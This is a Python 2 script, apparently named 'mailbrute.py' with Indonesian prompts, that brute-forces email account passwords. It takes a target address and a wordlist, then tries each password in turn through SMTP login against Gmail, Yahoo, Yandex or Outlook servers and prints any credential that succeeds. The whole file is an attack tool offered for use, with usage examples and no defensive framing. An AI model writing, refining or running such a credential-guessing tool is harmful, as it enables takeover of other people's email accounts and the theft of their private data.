#coding: utf-8
import smtplib
import sys

###  MEMBERI WARNA  ###
merah	= "\033[91m"
kuning	= "\033[93m"
hijau	= "\033[92m"
ungu	= "\033[95m"
######################
print merah
print "===================================================================="
print "  [+] Coded By marioyhzkiell "
print "  [+] Brute Force Gmail, Yahoo, Yandex, Outlook "
print ""
print "  [+] use: python mailbrute.py exemple@gmail.com exaple-wordlist.txt"
print "  [+] use: python mailbrute.py exemple@yahoo.com exaple-wordlist.txt"
print "  [+] use: python mailbrute.py exemple@yandex.com exaple-wordlist.txt"
print "  [+] use: python mailbrute.py exemple@outlook.com exaple-wordlist.txt"
print ""
print "  [*] Target Email: " + sys.argv[1]
print "===================================================================="
print ""
print ""
print kuning
print "pilih mail server"
print ""
print "1.google"
print "2.yahoo"
print "3.yandex"
print "4.outlook"
print hijau
pilihservernya = raw_input("masukan pilihan (1/2/3/4) : ")

if pilihservernya == '1':
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()
	user = sys.argv[1]
	wordlist = open(sys.argv[2], "r")
	for brute in wordlist:
	    try:
		server.login(user, brute)
		print merah
		print "==============================================================="
		print("[+] Success : %s") % "Email: " + user + " Pass: " + brute
		print "==============================================================="
		break
	    except:
		print("[-] Password Belum Ditemukan: %s") % brute
elif pilihservernya == '2':
	server = smtplib.SMTP('smtp.mail.yahoo.com', 587)
	server.ehlo()
	server.starttls()
	user = sys.argv[1]
	wordlist = open(sys.argv[2], "r")
	for brute in wordlist:
	    try:
		server.login(user, brute)
		print merah
		print "==============================================================="
		print("[+] Success : %s") % "Email: " + user + " Pass: " + brute
		print "==============================================================="
		break
	    except:
		print("[-] Password Belum Ditemukan: %s") % brute
elif pilihservernya == '3':
	server = smtplib.SMTP('smtp.yandex.com', 587)
	server.ehlo()
	server.starttls()
	user = sys.argv[1]
	wordlist = open(sys.argv[2], "r")
	for brute in wordlist:
	    try:
		server.login(user, brute)
		print merah
		print "==============================================================="
		print("[+] Success : %s") % "Email: " + user + " Pass: " + brute
		print "==============================================================="
		break
	    except:
		print("[-] Password Belum Ditemukan: %s") % brute
elif pilihservernya == '4':
	server = smtplib.SMTP('smtp-mail.outlook.com', 587)
	server.ehlo()
	server.starttls()
	user = sys.argv[1]
	wordlist = open(sys.argv[2], "r")
	for brute in wordlist:
	    try:
		server.login(user, brute)
		print merah
		print "=============================================================="
		print ("[+] Success : %s") % "Email: " + user + " Pass: " + brute
		print "=============================================================="
		break
	    except:
		print("[-] Password Belum Ditemukan: %s") % brute
else :
	print ungu
	print "input salah!!!"
	system ('clear')
